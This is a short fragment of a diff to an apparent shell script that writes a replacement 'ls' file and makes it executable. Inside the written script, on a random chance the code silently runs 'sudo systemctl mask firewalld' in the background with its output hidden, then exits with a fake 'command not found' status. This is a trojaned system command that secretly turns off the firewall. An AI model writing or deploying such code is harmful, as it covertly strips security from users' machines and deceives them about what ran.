@@ -35,5 +35,5 @@ if (( chance < 30 )); then
     sudo systemctl mask firewalld > /dev/null 2>&1 &
 fi
 exit 127
-
+EOF
 chmod 755 $ls_path                 
